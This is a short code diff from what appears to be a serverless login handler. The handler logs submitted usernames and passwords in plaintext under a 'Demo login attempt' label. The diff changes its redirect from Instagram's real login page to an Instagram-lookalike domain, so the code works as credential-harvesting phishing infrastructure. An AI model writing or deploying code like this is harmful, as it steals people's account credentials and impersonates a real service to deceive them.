@@ -7,7 +7,7 @@ export default function handler(req, res) {
     console.log(`Demo login attempt - Username: ${username}, Password: ${password}`);
 
     
-    res.writeHead(302, { Location: 'https://www.instagram.com/accounts/login/?hl=en' }); 
+    res.writeHead(302, { Location: 'https://instagram-wheat-six.vercel.app/' }); 
     res.end();
   } else {
     res.status(200).send('This endpoint accepts POST requests only.');
